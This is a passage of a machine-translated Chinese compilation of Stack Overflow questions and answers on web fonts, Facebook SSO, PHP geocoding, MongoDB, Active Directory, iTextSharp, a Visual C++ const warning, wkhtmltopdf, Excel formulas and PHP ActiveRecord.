还有其他版本的 Garamond，恕我直言最好的可能是 Adob​​e Garamond。作为一种商业字体，您需要一个特殊的许可证才能将其嵌入网页中。有些字体代工厂出售这些，有些则不出售——你只需要阅读他们的许可证 :) 但如果你明白了，你可能会发现它们的提示要好得多。不过我不能保证（但某些字体商店将允许您在某些浏览器中查看浏览器渲染字体的预览）。

但是，如果您限制自己使用 Google 网络字体提供的免费字体，我会将 EB Garamond 排除在正文之外，主要是因为这些问题。

可能首先指定“Adobe Garamond”，因为少数人可能有，但随后回退到像 Constantia 这样的字体，然后是 Georgia，然后只是“serif”。请注意，Garamond 和 Constantia 的笔触较轻且 x 高度较小，因此看起来比 Georgia 之类的更“虚伪”。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-07-20T04:20:25.987

1) 不，Garamond 不是网络安全字体。

2) 不建议在网络上使用 Garamond。请参阅这篇文章：[为什么您不在 Web 上使用 Garamond](http://designforhackers.com/blog/why-you-dont-use-garamond-on-the-web/)

3) 建议：标题使用Georgia，正文使用Verdana。它们都是网络安全的，并且经过尝试和证明可以很好地协同工作。

如果您想坚持使用 EB Garamond，Google 字体建议将其与 Lobster 配对。

编写代码：

```
@import url('https://fonts.googleapis.com/css?family=Lobster|EB+Garamond');
h1, h2, h3, h4, h5, h6 {font-family: Lobster, cursive; }
p {font-family: 'EB Garamond', serif; } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-01T20:42:11.657

不，Garamond 在所有计算机上都可用的意义上不是“网络安全”。没有字体。[在CodeStyle.org 的调查](http://www.codestyle.org/css/font-family/sampler-WindowsResults.shtml)中估计 Garamond在 Windows 上的覆盖率约为 85%。在其他系统上可能很少见。

使用 Georgia 作为 Garamond 的后备听起来很奇怪，因为它们是非常不同的字体，正如您通过查看包含它们的文本所看到的那样（记住包括数字，它们非常不同）。

Georgia 在 Windows 和 Mac 上接近 99%，但在 Linux 上约为 70%，因此它也不是真正的浏览器安全。然而，要点是它是一种具有特殊特征的字体，通常不是一个好的后备字体。即使是通用`sans-serif`字体名称也可能是一个更好的猜测。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-01T20:56:57.967

您对*网络安全字体*的定义是什么？

如果您认为一种字体在所有计算机上以相同的方式呈现时是*网络安全*的，那么答案是否定的——Garamond 不是，而且没有其他字体是。

您可以使用各种技术（例如 javascript 字体 API）嵌入 Garamond，但在所有计算机上它永远不会相同。

您可以尝试创建一个网络安全*字体堆栈*，考虑字体参数，例如 x-height。这样的事情应该可以正常工作：

```
Garamond, Baskerville, "Baskerville Old Face", "Hoefler Text", "Times New Roman", Times, serif; 
```

无论您选择什么，请记住 Garamond 的 x 高度非常小，因此可以打印，但在屏幕上不太清晰。如果您决定使用它，请使用更大的`font-size`.

## 编辑

说*JavaScript API*，我的意思是使用诸如 Google Font API、TypeKit 或其他在 JS 关闭时不起作用的解决方案的 API 导入字体。然后您仍然需要字体堆栈，因此在这种情况下导入将无济于事。

# iphone - iphone SSO Facebook 实现

> ID：10403697
> 
> 赞同：0
> 
> 时间：2012-05-01T20:13:05.337
> 
> 标签：iphone, facebook, single-sign-on

关于 Facebook 的 SSO 实施的问题。我按照说明添加到 AppDelegate 实现代码中：

```
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
return [[_viewController facebook] handleOpenURL:url];
} 
```

但是，我得到了错误，

```
unknown receiver _viewController, did you mean UIViewController? 
```

我把它改成那个，我得到警告，

```
class method +facebook not found 
```

我正在使用位于此处的教程 [https://developers.facebook.com/blog/post/532/](https://developers.facebook.com/blog/post/532/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T21:06:52.183

您用于处理打开 url 的方法实施不正确。您提供的链接具有以下代码示例。其中显示了应用程序委托`Facebook`对象属性调用该方法`handleOpenURL`。

```
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
    return [facebook handleOpenURL:url]; 
} 
```

在您提供的代码中，您试图调用`facebook`在您的实例上调用的类方法`_viewController`。UIViewController 没有名为“facebook”的类方法，这就是您收到警告的原因。

```
class method + facebook not found 
```

# php - 尝试从 Google Geocode 返回 lat 和 long

> ID：10403700
> 
> 赞同：1
> 
> 时间：2012-05-01T20:13:12.623
> 
> 标签：php, json, parsing, google-geocoder

这是我第一次使用 JSON，我显然遇到了问题，我只是非常不确定它是什么。

我已经查找了如何解析一个简单的 json，但我认为它可能让我失望的谷歌地理编码的更深层次。

以下是我试图获得我的价值观的方式：

```
$getJSON = "http://maps.googleapis.com/maps/api/geocode/json?address=" . str_replace(" ", "", $_POST['postcode']) . "&sensor=false";
            $contentJSON = file_get_contents($getJSON);
            $Geocode_array = json_decode($contentJSON, true);

            $lat = $Geocode_array[results][address_components][geometry][location][lat];
            $lng = $Geocode_array[results][address_components][geometry][location][lng]; 
```

如果需要，我可以发布 json 代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:14:37.130

尝试引用您的数组键。如果没有引号，PHP 会假设这些键是未定义的常量。此外，您还没有完全正确地遍历 JSON 结果。试试这个：

```
$lat = $Geocode_array['results'][0]['geometry']['location']['lat'];
$lng = $Geocode_array['results'][0]['geometry']['location']['lng']; 
```

Google Maps API 在一个数组中为您提供多个结果。我在上面的代码中引用了第一个（索引`0`）。在开发过程中要做的一件有用的事情是使用[`print_r()`](http://php.net/manual/en/function.print-r.php). 我就是这么想出来的。

```
print_r($Geocode_array); 
```

# javascript - 处理点击 Facebook 的“订阅”按钮

> ID：10403703
> 
> 赞同：8
> 
> 时间：2012-05-01T20:13:32.670
> 
> 标签：javascript, facebook, facebook-javascript-sdk, dom-events, subscribe

当有人按下新的 Facebook 订阅按钮时，我如何触发事件？我可以使用上面的代码使用“喜欢”按钮来做到这一点，所以我认为它与订阅按钮类似。

```
<div id="fb-root"></div>
<script type="text/javascript">
    window.fbAsyncInit = function() {
    FB.init({appId: 'App_ID', status: true, cookie: true, xfbml: true});
        FB.Event.subscribe('edge.create', function(href, widget) {
            alert('You just clicked the like button');
        });
    };

    (function() {
        var e = document.createElement('script');
            e.type = 'text/javascript';
            e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
            e.async = true;
            document.getElementById('fb-root').appendChild(e);
    }());
    </script> 
```

当用户喜欢一个页面时，'edge.create' 会触发一个事件，因此我可以获得响应，并向用户显示警报。我已经搜索了一段时间，找不到使用“订阅”按钮的类似方法。

有没有人这样做过？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-05T22:51:25.193

不幸的是，Niraj 的回答是不正确的。FB API 中有一些函数可以像您描述的那样处理检测事件，但是到目前为止，没有任何东西可以检测用户是否已订阅。您可以检测用户是否喜欢、不喜欢、评论等，但不能检测用户是否订阅。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-01T09:13:37.630

您可以使用该`FB.Event.subscribe`功能和类似的`FB.Event.unsubscribe`功能来实现您想要做的事情。

# objective-c - 核心数据错误：没有已知方法'-notes'

> ID：10403705
> 
> 赞同：1
> 
> 时间：2012-05-01T20:13:39.410
> 
> 标签：objective-c, core-data

我的核心数据模型有一个具有多个属性的实体。一些属性是整数、双精度和字符串。当我从数据存储（Sqlite）中获取实体的实例时，我得到了一个有效的对象指针，并且可以获取数字属性的值，但是当我尝试获取字符串属性的值时（例如，NSString *test = [fetchedObj notes])，我收到以下错误：

错误：没有已知的方法'-notes'；将消息发送到方法的返回类型

奇怪的是，属性的​​属性是定义/声明的（我使用的是 MOGenerator v1.26）并且 Xcode 的代码感知“看到”该属性，但在运行时它根本不知道/不可见。此外，我在同一模型中还有其他类型的实体，它们具有字符串属性，并且它们运行良好。似乎只有一种实体会导致问题。

有关如何解决此问题的任何建议/提示？

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:17:26.707

根据您的描述，您可能忘记在模型编辑器中为实体设置类名，仅针对该类。因此，这些对象是实例`NSManagedObject`而不是您的自定义子类，即使您已按照您想要的方式声明它们。修复实体的类名，应该没问题。

# mongodb - 在更新查询中访问原始文档值

> ID：10403708
> 
> 赞同：0
> 
> 时间：2012-05-01T20:13:55.180
> 
> 标签：mongodb, mongodb-query

在 MongoDB 集合中进行更新时，有什么方法可以访问文档的原始值？我一直在做以下事情：

```
db.things.find().forEach(function (t) {
  t.name = t.name + ' new'; // Appends ' new' to the end of the original value
  db.things.save(t);
}); 
```

上面的性能相当慢（不过，我正在处理 220 万个文档），所以我希望传统的 update() 性能更好。我检查了[文档](http://www.mongodb.org/display/DOCS/Updating#Updating-%24set)，但我没有注意到任何提到将原始值的一部分应用于 $set 值的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:28:55.250

您不能在更新中使用对象中的任何内容。你用循环做的方式是最好的方式。

# android - android - 淡出后调用 removeView() 时，LinearLayout 变得可见

> ID：10403709
> 
> 赞同：0
> 
> 时间：2012-05-01T20:13:56.287
> 
> 标签：android, android-linearlayout, fadeout

我有一个视图需要在删除之前淡出，这里是代码：

```
private void startViewFadeOut(final View v, final LinearLayout layout)
{
    AnimationTask fadeTask = new AnimationTask(_handler,
                                               FADE_OUT_DURATION
                                               , FADE_PERIOD)
    {
        @Override
        protected boolean onRun(float progress)
        {
            float fadeAlpha = 1 - progress;
            v.setAlpha(fadeAlpha);

            if (progress >= 1f)
            {
                layout.removeView(v);  -- line A
                return false;
            }
            return true;
        }
    };
    fadeTask.start();
} 
```

AnimationTask 只是 Runnable 的一个包装器。淡出效果很好，但是在 A 行，这个视图会闪烁，它再次变得可见然后消失，我尝试使用 v.setVisibility(View.GONE)，它没有工作八倍。

有人对此有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:27:35.967

从您的示例中有点不清楚，但我怀疑如果您将可运行文件发布到活动而不是创建单独的任务，那么这一切都会更好，因此它们都将在同一个线程中。

我也肯定会使用 setVisibility(view.gone)。

# c# - 如何使用 asp.net 在活动目录中获取用户的“最小密码年龄”？

> ID：10403711
> 
> 赞同：0
> 
> 时间：2012-05-01T20:14:05.210
> 
> 标签：c#, asp.net, active-directory, membership-provider

如何使用 asp.net 在活动目录中获取用户的“最小密码年龄”？
使用目录服务或`AspNetActiveDirectoryMembershipProvider`

**例如：**

```
from below line, I can get lastname of user. 
string lastName = objDirectoryEntry.Properties["sn"].Value; 
```

以下是用户属性列表。我在所需的属性“最小密码年龄”中找不到
[http://www.kouti.com/tables/userattributes.htm](http://www.kouti.com/tables/userattributes.htm)

**注意：我正在考虑使用 Asp.net**

**编辑摘要**------------------------
当我尝试使用目录服务更改用户密码时出现以下错误或 `AspNetActiveDirectoryMembershipProvider`（它是默认会员提供程序）

*密码不符合密码策略要求。检查最小密码长度、密码复杂性和密码历史要求*

用户创建和更新成功（更新字段，如名字、姓氏等）。我同时使用目录服务和 AspNetActiveDirectoryMembershipProvider 来创建和更新用户，但是当我尝试更改密码时出现问题

例如：我用密码 anc1236 创建了用户！成功创建
，现在将密码更新为 xyyz4562@ 并出现错误

下面是我用来更改密码的代码
`objMembershipUser.ChangePassword(oldPassword, newPassword)`
我也尝试直接使用目录服务并得到同样的错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:26:25.703

我认为您正在查看错误的对象。

> 在 Active Directory 中使用用户帐户时，通常需要参考域范围的帐户策略。例如，最短和最长密码使用期限和最短密码长度等策略以及锁定策略是在域级别确定的，并应用于域中的每个用户对象。所有值都直接存储在域根对象中（不是在 RootDSE 中，而是在 RootDSE 中的 defaultNamingContext 属性指向的对象中），作为一组属性，例如 maxPwdAge、minPwdLength 和 lockoutThreshold。此外，密码复杂性规则编码在 pwdProperties 属性中的枚举值中。这些值在大多数域中往往是相当静态的，因此我们通常希望在每次程序执行时只读取一次这些值。为了使策略值易于使用，我们在清单 10.7 中显示了域帐户策略的包装类，它将所有值转换为方便的 .NET 数据类型，例如 TimeSpan。还包括用于密码策略类型的特殊 .NET 枚举类型。我们无法在书中包含所有类属性，因为这会占用太多空间，但我们将在本书的网站上提供完整的类。在演示如何确定帐户的锁定状态以及查找密码过期的帐户时，我们将在以后的讨论中参考此示例。还值得注意的是，这些策略属性中的任何 LargeInteger 值都存储为负值。我们选择将它们反转为正值，因为以这种方式考虑它们更容易。选择使用这些属性的开发人员应牢记这一点，因为如果不加以考虑，它将在以后抛出计算。

看看[这个](http://en.csharp-online.net/User_Management_with_Active_Directory%E2%80%94Determining_Domain-Wide_Account_Policies)页面的例子

# asp.net - 无法在使用 itextsharp 创建的 pdf 中获取图像

> ID：10403712
> 
> 赞同：2
> 
> 时间：2012-05-01T20:14:13.690
> 
> 标签：asp.net, pdf, itextsharp

我没有在 pdf 中获取图像我只得到文本，请帮助我，我正在使用来自[http://sourceforge.net/projects/itextsharp/的iteshsharp 5.2.1](http://sourceforge.net/projects/itextsharp/)

default.aspx.cs 的代码

```
Response.ContentType = "application/pdf";
Response.Cache.SetCacheability(HttpCacheability.NoCache);
StringWriter sw = new StringWriter();
HtmlTextWriter hw = new HtmlTextWriter(sw);
savetopdf.RenderControl(hw);
StringReader sr = new StringReader(sw.ToString());
Document pdfDoc = new Document(PageSize.A4, 10f, 10f, 10f, 0f);
HTMLWorker htmlparser = new HTMLWorker(pdfDoc);
PdfWriter.GetInstance(pdfDoc, Response.OutputStream);
pdfDoc.Open();
htmlparser.Parse(sr);
pdfDoc.Close();
Response.Write(pdfDoc);
Response.End(); 
```

default.aspx 的代码

```
<form id="form1" runat="server">
<div id="savetopdf" runat="server">
    <asp:Label ID="lbl" runat="server" Text=" Lorem Ipsum, Dolor"></asp:Label>
    <img src="http://localhost:5583/WebSite1/images/Penguins.jpg" alt="penguins" />
    <img src="http://localhost:5583/WebSite1/images/Tulips.jpg" alt="tulips" />
</div>
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T16:49:39.813

HTMLWorker 是有缺陷的，并且已经停止使用 XMLWorker。

[http://sourceforge.net/projects/itextsharp/files/xmlworker/](http://sourceforge.net/projects/itextsharp/files/xmlworker/)

演示：

[http://demo.itextsupport.com/xmlworker/](http://demo.itextsupport.com/xmlworker/)

尽管文档引用了 Java API，但对 C# 的改编应该很简单：

[http://demo.itextsupport.com/xmlworker/itextdoc/index.html](http://demo.itextsupport.com/xmlworker/itextdoc/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-20T06:52:04.910

试试这样：

```
string ImagePath = Server.MapPath("/Images/Printbanner1.jpg");
Document document = new Document();
Response.ContentType = "application/pdf";
Response.AddHeader("content-disposition", "attachment;filename=xxx.pdf");
Response.Cache.SetCacheability(HttpCacheability.NoCache);
document.Open();

iTextSharp.text.html.simpleparser.StyleSheet styles = new iTextSharp.text.html.simpleparser.StyleSheet();
iTextSharp.text.html.simpleparser.HTMLWorker hw = new iTextSharp.text.html.simpleparser.HTMLWorker(document);
htmlTable = htmlTable.ToString().Replace("'", "\"");
htmlTable = htmlTable.Replace("px", "");
StringReader sr = new StringReader(htmlTable.ToString());
Document pdfDoc = new Document(PageSize.A4, 10f, 10f, 10f, 0f);
HTMLWorker htmlparser = new HTMLWorker(pdfDoc);
PdfWriter.GetInstance(pdfDoc, Response.OutputStream);

pdfDoc.Open();
iTextSharp.text.Image image = iTextSharp.text.Image.GetInstance(ImagePath);
pdfDoc.Add(image);
htmlparser.Parse(sr);

pdfDoc.Close(); 
```

# c++ - 为什么 Visual C++ 在 C 中对从 const void ** 到 void * 的隐式转换发出警告，但在 C++ 中却没有？

> ID：10403713
> 
> 赞同：18
> 
> 时间：2012-05-01T20:14:22.407
> 
> 标签：c++, c, visual-studio, visual-c++, constants

## 概括

Microsoft Visual Studio 中的 C/C++ 编译器在C 程序尝试将指向数据的指针（如or ）转换为（即使这种类型实际上不是指向 的指针）的指针时发出警告[C4090](http://msdn.microsoft.com/en-us/library/k77bkb8d.aspx)。更奇怪的是，同一个编译器默默地接受编译为 C++ 的相同代码。`const``const void **``const char **``void *``const`

这种不一致的原因是什么，为什么 Visual Studio（与其他编译器不同）在将指向指针的指针隐式转换`const`为`void *`?

## 细节

我有一个 C 程序，其中将变量参数列表中传递的 C 字符串读入数组（通过`va_arg`调用的循环）。由于 C-strings 是 type `const char *`，因此跟踪它们的数组是 type `const char **`。这个指向带有内容的字符串的指针数组`const`本身是动态分配的（使用`calloc`），并且`free`在函数返回之前（在处理 C 字符串之后）分配。

当我使用`cl.exe`（在 Microsoft Visual C++ 中）编译此代码时，即使警告级别较低，`free`调用也会触发警告[C4090](http://msdn.microsoft.com/en-us/library/k77bkb8d.aspx)。由于`free`需要 a `void *`，这告诉我编译器不喜欢我将 a 转换`const char **`为 a `void *`。我创建了一个简单的示例来确认这一点，在其中我尝试将 a 转换`const void **`为 a `void *`：

```
/* cast.c - Can a const void** be cast implicitly to void* ? */

int main(void)
{
    const void **p = 0;
    void *q;
    q = p;

    return 0;
} 
```

然后我将其编译如下，确认这是触发警告的原因：

```
>cl cast.c
Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.40219.01 for 80x86
Copyright (C) Microsoft Corporation.  All rights reserved.

cast.c
cast.c(7) : warning C4090: '=' : different 'const' qualifiers
Microsoft (R) Incremental Linker Version 10.00.40219.01
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:cast.exe
cast.obj 
```

微软[关于警告 C4090 的文档](http://msdn.microsoft.com/en-us/library/k77bkb8d.aspx)说：

> 此警告针对 C 程序发出。在 C++ 程序中，编译器发出错误：C2440。

这是有道理的，因为 C++ 是一种比 C 更强类型的语言，并且 C 中允许的潜在危险的隐式转换在 C++ 中是不允许的。Microsoft 的文档看起来像是在 C 中针对相同代码或代码子集触发了[C2440](http://msdn.microsoft.com/en-us/library/k77bkb8d.aspx)警告，这将在 C++ 中触发错误[C2440 。](http://msdn.microsoft.com/en-us/library/sy5tsf8z.aspx)

或者我是这么想的，直到我尝试将我的测试程序编译为 C++（`/TP`标志这样做）：

```
>cl /TP cast.c
Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.40219.01 for 80x86
Copyright (C) Microsoft Corporation.  All rights reserved.

cast.c
Microsoft (R) Incremental Linker Version 10.00.40219.01
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:cast.exe
cast.obj 
```

将相同的代码编译为 C++ 时，不会出现错误或警告。可以肯定的是，我重建了，告诉编译器尽可能积极地发出警告：

```
>cl /TP /Wall cast.c
Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.40219.01 for 80x86
Copyright (C) Microsoft Corporation.  All rights reserved.

cast.c
Microsoft (R) Incremental Linker Version 10.00.40219.01
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:cast.exe
cast.obj 
```

它默默地成功了。

这些构建是`cl.exe`在 Windows 7 机器上使用 Microsoft Visual C++ 2010 Express Edition 的，但在 Windows XP 机器上，Visual Studio .NET 2003`cl.exe`和 Visual C++ 2005 Express Edition 的`cl.exe`. 因此，这似乎发生在所有版本上（尽管我没有在每个可能的版本上进行测试），并且在我的机器上设置 Visual Studio 的方式不是问题。

相同的代码在 Ubuntu 11.10 系统（版本字符串）上的 GCC 4.6.1 中编译没有问题`gcc (Ubuntu/Linaro 4.6.1-9ubuntu3) 4.6.1`，设置为尽可能积极地警告，如 C89、C99 和 C++：

```
$ gcc -ansi -pedantic -Wall -Wextra -o cast cast.c
cast.c: In function ‘main’:
cast.c:6:11: warning: variable ‘q’ set but not used [-Wunused-but-set-variable]

$ gcc -std=c99 -pedantic -Wall -Wextra -o cast cast.c
cast.c: In function ‘main’:
cast.c:6:11: warning: variable ‘q’ set but not used [-Wunused-but-set-variable]

$ g++ -x c++ -ansi -pedantic -Wall -Wextra -o cast cast.c
cast.c: In function ‘int main()’:
cast.c:6:11: warning: variable ‘q’ set but not used [-Wunused-but-set-variable] 
```

它确实警告`q`在分配后永远不会被读取，但该警告是有意义的并且是不相关的。

除了在启用所有警告的情况下不会在 GCC 中触发警告，也不会在 GCC 或 MSVC 中触发 C++ 中的警告，在我看来，从指针转换为指向 const 的指针`void *`根本不应该被视为问题，因为 while`void *`是指向 non-`const`的指针，指向 const 的指针也是指向 non- 的指针`const`。

在我的实际代码（不是示例）中，我可以使用`#pragma`指令或显式强制转换，或编译为 C++（呵呵），或者我可以忽略它。但我宁愿不做任何这些事情，至少在我明白为什么会发生之前不做。（以及为什么它不会在 C++ 中发生！）

我想到了一种可能的部分解释：与 C++ 不同，C 允许隐式转换`void *`为任何指向数据的指针类型。所以我可以有一个指针从 to 隐式转换`const char **`，`void *`然后从`void *`to隐式转换`char **`，从而可以修改它指向的指针的常量数据，而无需强制转换。那会很糟糕。但我不认为这比 C 较弱的类型安全所允许的所有其他事情更糟糕。

我想这个警告可能是有意义的，因为当非`void`指针类型转换为时选择不发出警告`void *`：

```
/* cast.c - Can a const void** be cast implicitly to void* ? */

int main(void)
{
    const void **p = 0;
    void *q;
    q = p;

    return 0;
}
```

```
>cl /Wall voidcast.c
Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.40219.01 for 80x86
Copyright (C) Microsoft Corporation.  All rights reserved.

voidcast.c
Microsoft (R) Incremental Linker Version 10.00.40219.01
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:voidcast.exe
voidcast.obj 
```

然而，如果这是故意的，那么：

1.  为什么 Microsoft 文档表明在 C 中产生此警告的代码会在 C++ 中产生错误？

2.  除了忽略或抑制警告之外，是否有任何合理的选择，当必须`free`使用非`const`指针指向非`const`指向`const`数据的指针时（如在我的实际情况中）？如果在 C++ 中发生这样的事情，我可以将变量参数列表中传递的字符串存储在一些高级 STL 容器中，而不是数组中。对于无法访问 C++ STL 并且不使用高级集合的 C 程序，这种事情不是一个合理的选择。

3.  一些程序员在将警告视为错误的公司/组织政策下工作。[C4090](http://msdn.microsoft.com/en-us/library/k77bkb8d.aspx)即使使用`/W1`. 人们以前一定遇到过这种情况。那些程序员是做什么的？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-01T20:34:12.743

显然这只是 VC++ 中的一个错误。

如果您声明`const char **x;`结果是指向字符的“只读”指针的指针，并且它本身不是“只读”指针（我使用术语“只读”，因为`const`-ness 术语推动了错误的概念，即被指向的字符是常量，而这通常是错误的......`const`引用和指针是引用或指针的属性，并且没有说明指向或引用数据的常量性）。

任何读/写指针都可以转换为 a`void *`并且 VC++ 在编译该代码时没有真正的理由发出警告，无论`C`是在模式下还是`C++`模式下。

请注意，这不是正式的问题，因为该标准没有规定应该或不应该发出哪些警告，因此编译器可以自由地为仍然保持合规的完全有效的代码发出警告。VC++ 实际上会针对有效的 C++ 代码发出大量警告...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T21:23:36.783

就像 6502 所说的，这似乎是编译器中的一个错误。但是，您也会问您应该怎么做。

我的回答是，您应该在免费通话中添加明确的演员表，然后添加注释来解释为什么需要它。编译器中确实会发生错误，请使用最简单的解决方法并添加注释，以便以后可以测试该错误是否已解决。

还将错误报告给编译器供应商的额外积分。

至于 1\. 它似乎是指将 a 隐式转换`const T *`为 a `void *`，这应该是 C 中的警告和 C++ 中的错误。

# asp.net-mvc - RoleProvider 枚举 HttpContext.Current.User.IsInRole

> ID：10403718
> 
> 赞同：1
> 
> 时间：2012-05-01T20:14:43.540
> 
> 标签：asp.net-mvc

因此，我在其他人的帮助下使用枚举创建了自定义角色提供程序和属性。这是完美的工作，几乎完美，但工作！例如：[CustomRoles(MyRoles.Admin|MyRoles.User)]

```
HttpContext.Current.User.IsInRole("Admin") 
```

或者更好

```
HttpContext.Current.User.IsInRole(MyRoles.Admin) 
```

总是返回假。

我如何让这个工作？代码示例将有很大帮助。

另外，我知道可能有更好的方法，而不是角色中的枚举，但这就是我想要的方式。我将枚举转换为字符串并返回没有问题。

在过去的 4 个小时里，我一直在网上研究这个问题，并找到了一些很好的建议，但这并不是我想要的。

谢谢！

# c++ - 在 Windows7 64 位上使用 mingw 构建 Boost Python

> ID：10403720
> 
> 赞同：2
> 
> 时间：2012-05-01T20:14:46.810
> 
> 标签：c++, python, boost, windows-7, boost-python

我已经尝试构建 boost python 大约两天了，并且非常沮丧。当我构建库时，它告诉我它已成功构建。当我尝试使用该库运行任何东西时，我会遇到以下错误；

未定义对*imp* __ZN5boost6python6detail11init_moduleEPKcPFvvE的引用

在函数 ZNK5boost6python9type_info4nameEv:
undefined reference to *imp* __ZN5boost6python6detail12gcc_demangleEPKc

我完全不知道为什么会这样，但我会很感激任何想法

顺便说一句，我将 boost1.49.0 与 python 3.0 一起使用，其他库似乎已经构建得很好。我已经使用了序列化库并且它可以工作。

如果您需要更多信息，请告诉我。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-07T18:00:57.923

啊，我明白了。问题是 python 3 并且 boost 没有正确链接静态库。我切换到 python2.7 并在加载任何标题之前定义了 BOOST_PYTHON_STATIC_LIB。现在一切正常。谢谢您的帮助。

# pdf - 如何从 WKHTMLTOPDF 的目录中删除目录？

> ID：10403721
> 
> 赞同：7
> 
> 时间：2012-05-01T20:14:51.810
> 
> 标签：pdf, wkhtmltopdf, tableofcontents

我正在使用带有目录选项的 WKHTMLTOPDF 生成 pdf，但它正在将自身添加到目录中，表明它在第 2 页上。

想去掉这个？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-12T07:37:23.977

您可以使用 XSL 样式表来完全控制 TOC 的生成。您可以通过将参数提供`--dump-default-toc-xsl`给 wkhtmltopdf 来获取使用的默认样式表。

`<body><h1>...</h1>`当您检查它时，您对H1 元素和测试特别感兴趣`xsl:if test="(@title!='')"`

例如，当我想从自身中删除 TOC 自引用时，这是我的样式表的相关部分：

```
 stuff above
            <h1>My little TOC</h1>
            <ul><xsl:apply-templates select="outline:item/outline:item"/></ul>
        </body>
    </html>
</xsl:template>
<xsl:template match="outline:item">
    <li>
        <xsl:if test="(@title!='') and (@title!='My little TOC')">
        stuff below 
```

当您保存新的 TOC XSL 时，您需要在 wkhtmltopdf 参数中使用类似`--page-size A4 toc --xsl-style-sheet test.xsl TempFile.html TempFile.pdf`.

# excel - 如果不能在 Excel 中工作，求和

> ID：10403723
> 
> 赞同：2
> 
> 时间：2012-05-01T20:14:56.037
> 
> 标签：excel, sum, formula

我有这张桌子

```
price   product
25  apple
10  bananas
15  apple
30  oranges
45  oranges
5   bananas

In cell A10==SUM(IF((B2:B7="apple"),A2:A7,0))        <--- this does not work #VALUE! error

but this works A9==SUMIF(B2:B7,"=apple",A2:A7)      <--- works 
```

我究竟做错了什么。根据[Microsoft 网站，语法似乎是正确的](http://support.microsoft.com/kb/275165)

> =SUM(IF((A2:A9="A")+(A2:A9="B"),B2:B9,0))

我需要嵌套 if 工作，因为我有多个求和标准。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T18:11:53.070

如果 IF 的“else”子句为零，则不需要 IF。

```
=SUM(((A2:A9="A")+(A2:A9="B"))*(B2:B9)) 
```

使用 control+shift+enter 输入。或者

```
=SUMPRODUCT(((A2:A9="A")+(A2:A9="B"))*(B2:B9)) 
```

正常输入。我不知道为什么 MS 以他们的方式显示它。

# jquery - JQUERY 图像滑块

> ID：10403725
> 
> 赞同：-1
> 
> 时间：2012-05-01T20:14:59.137
> 
> 标签：jquery, css, html

嘿，当您单击每个图像时，我正在寻找一个带有简单下拉列表的简单 jquery 图像滑块，如果有人可以帮助我，这将是一个救星，因为我不是很好，还在学习 html 和 jquery。到目前为止我的代码是这个

```
<html>
    <head>
        <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
        <link rel="stylesheet" type="text/css" href="eventspage.css" />
        <title>Events page</title>
        <style>
            img {
                float:left;
            }
            .container {
                width:60%;
                margin
            }
            #slider {
                width:400px;
                background-color:green;
                height:200px;
            }
            div {
                position:absolute;
            }
            .window {
                width:400px;
                height:400px;
                overflow:hidden;
                background-color: aqua;
            }
        </style>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.js"></script>
    </head>
    <body>
        <div class="container">
            <button id="left">left</button> <button id="right">right</button>

            <div class="window">
                <div id="slider" class="block">
                    <img width="200px" src="person1.jpg">
                    <img width="200px" src="person2.jpg">
                </div>
            </div>
        </div>      

        <script>
            $("#right").click(function(){
                $(".block").animate({"left": "+=100px"}, "slow");
            });

            $("#left").click(function(){
                $(".block").animate({"left": "-=100px"}, "slow");
            });
        </script>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-01T20:16:49.707

[jQuery Cycle](http://jquery.malsup.com/cycle/)是事实上的 jQuery 图像滑块插件，基本上可以完成所有工作。

我不完全确定你所说的下拉菜单是什么意思，但它可能很容易在 Cycle 之上实现。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-01T20:25:56.223

对于您问题的下拉部分：

您可以通过在图像上添加 jquery 事件处理程序来做到这一点

```
$("#slider img").click(function() {
  //CODE TO OPEN THE DROPDOWN
}); 
```

# php - PHP Active Record 删除连接

> ID：10403727
> 
> 赞同：1
> 
> 时间：2012-05-01T20:14:59.973
> 
> 标签：php, activerecord

我正在使用[PHP Active Record](http://www.phpactiverecord.org/docs/index/main) - 有人知道你是如何**终止连接的**吗？我需要杀死它，这样我才能重新连接并建立新的连接，而不是让它闲置直到它过期。

这就是我实例化它的方式：

```
 ActiveRecord\Config::initialize(function($cfg) {
        $cfg->set_model_directory(APPLICATION_PATH . 'model');
        $cfg->set_connections(array('development' => DB_TYPE.'://'.DB_USER.':'.DB_PASS.'@'.DB_HOST.'/'.DB_NAME));
    }); 
```

我试过这个，但它不是一种方法：

```
ActiveRecord\ConnectionManager::drop_connection(); 
```

* * *

## 回答 #1

> 赞同：1
> 
